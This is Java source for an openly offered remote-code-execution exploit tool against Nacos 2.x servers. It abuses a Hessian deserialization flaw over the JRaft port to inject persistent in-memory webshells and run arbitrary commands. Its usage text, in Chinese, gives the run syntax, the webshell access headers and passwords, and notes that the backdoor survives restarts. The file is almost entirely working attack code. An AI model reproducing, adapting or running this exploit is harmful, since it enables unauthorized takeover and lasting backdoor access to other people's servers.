package com.nacostools.rce;


import com.alibaba.nacos.consistency.entity.ConnectShell;
import com.alibaba.nacos.consistency.entity.HessianPayload;
import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.google.protobuf.ByteString;



import java.io.*;

import java.lang.reflect.Field;

import java.net.URL;
import java.util.concurrent.ConcurrentHashMap;


public class NacosRce {

    public static void main(String[] args) throws Exception {

        System.err.println("\n" +
                "  _   _                     ____          \n" +
                " | \\ | | __ _  ___ ___  ___|  _ \\ ___ ___ \n" +
                " |  \\| |/ _` |/ __/ _ \\/ __| |_) / __/ _ \\\n" +
                " | |\\  | (_| | (_| (_) \\__ \\  _ < (_|  __/\n" +
                " |_| \\_|\\__,_|\\___\\___/|___/_| \\_\\___\\___|\n" +
                "                                          \n");
//        String mod = "xslt";
        URL urlAddr = null;
        String jraftPort = "";
        String jraftAddr = "";
        String cmd = "";
//示例	java -jar NacosRce.jar http://192.168.90.1:8848  7848 "whoami"
        if (args.length != 3 && args.length != 4) {
            printUsage();
            System.exit(0);
        }else {
            urlAddr = new URL(args[0]);
            jraftPort = args[1];
            jraftAddr = urlAddr.getHost()+":"+jraftPort;
            cmd = args[2];
            if (args.length == 4){
                HessianPayload.os = args[3];
            }

        }


        ConnectShell c = new ConnectShell(urlAddr);
        boolean isWebshell = c.isWebShell();

        //未检测到内存马，自动注入。
        if(!isWebshell){
            System.err.println("*****未检测到内存马，自动注入开始*****");
            Object hashMap0 =  HessianPayload.genPayloadOfXslt("memshell");
            Object hashMap1 =  HessianPayload.genPayloadOfXslt("run");
            //构造metadata
            MetadataOperation mo0 = new MetadataOperation<>();

            mo0.obj0 = hashMap0;
            mo0.obj1 = hashMap1;
            ByteArrayOutputStream baos0 = getByteArrayOutputStream(mo0);

            try {
                sendPayload(jraftAddr,baos0.toByteArray());
            }catch (Exception e){
                System.err.println(e);
            }
            if(c.isWebShell()){
                System.err.println("*****自动注入结束，注入成功*****");
                if(!"memshell".equalsIgnoreCase(cmd)){
                    System.err.println("result:"+c.execCmd(cmd));
                    System.exit(0);
                }
            }else {
                System.err.println("*****自动注入结束，注入失败*****");
                System.exit(0);
            }


        }else if("memshell".equalsIgnoreCase(cmd)){
            System.err.println("*****检测到内存马仍存活，无需再次注入！*****");
            System.exit(0);
        }else {
            System.err.println("result:"+c.execCmd(cmd));
            System.exit(0);
        }

    }




    private static ByteArrayOutputStream getByteArrayOutputStream(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
//        output.getSerializerFactory().setAllowNonSerializable(true);

        try {
            SerializerFactory serializerFactory = output.getSerializerFactory();
            serializerFactory.setAllowNonSerializable(true);
            output.writeObject(obj);
            output.flushBuffer();
        }catch (Exception e){
            System.err.println(e);
        }


        return baos;
    }

    public static void sendPayload(String addr,byte[] payload) throws Exception{

        //节点标识信息
        //发请求
        Configuration conf = new Configuration();
        conf.parse(addr);
        RouteTable.getInstance().updateConfiguration("nacos", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
        PeerId leader = PeerId.parsePeer(addr);

        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());

        //payload绑定到writeRequest中
        //todo 未来也许要实现自定义Group
//        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service_v2").setData(ByteString.copyFrom(payload)).build();
        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_service_metadata").setData(ByteString.copyFrom(payload)).build();
//        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_instance_metadata").setData(ByteString.copyFrom(payload)).build();
         //发送
        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
//        System.out.println(o.toString());

    }
    private static void printUsage() {
        System.err.println("Nacos Hessian 反序列化漏洞利用工具 v0.5");
        System.err.println("Author: 刨洞安全 && 凉风");
        System.err.println("https://github.com/c0olw/NacosRce");
        System.err.println("** 食用方式 **");
        System.err.println("自动注入内存马并执行命令\tjava -jar NacosRce.jar Url Jraft端口 \"Command\" ");
        System.err.println("示例\tjava -jar NacosRce.jar http://192.168.90.1:8848/nacos  7848 \"whoami\" ");
        System.err.println("只注入内存马\tjava -jar NacosRce.jar http://192.168.90.1:8848/nacos 7848 memshell");
        //System.err.println("如果nacos是win的： \tjava -jar NacosRce.jar ip:port memshell windows");
        System.err.println("冰蝎内存马使用方法：\n1、需要设置请求头x-client-data:rebeyond\n2、设置Referer:https://www.google.com/\n3、路径随意\n4、密码rebeyond");
        System.err.println("哥斯拉内存马使用方法：\n1、需要设置请求头x-client-data:godzilla\n2、设置Referer:https://www.google.com/\n3、路径随意\n4、pass/key（默认的就行）");
        System.err.println("CMD内存马使用方法：\n1、需要设置请求头x-client-data:cmd\n2、设置Referer:https://www.google.com/\n3、请求头cmd:要执行的命令");
        System.err.println();
        System.err.println("v0.5版本实现了：");
        System.err.println("1、不出网漏洞利用");
        System.err.println("2、可多次发起漏洞利用");
        System.err.println("3、注入冰蝎/哥斯拉/CMD内存马");
        System.err.println("4、内存马对多版本Nacos进行了兼容");
        System.err.println("5、webshell连接验证+命令执行");
        System.err.println("");
        System.err.println("tips:\n1、请用jdk1.8\n2、适用于 Nacos 2.x <= 2.2.2\n3、非集群的也能打哦\n4、此内存马重启nacos依然存活\n");
        System.err.println();


    }

}
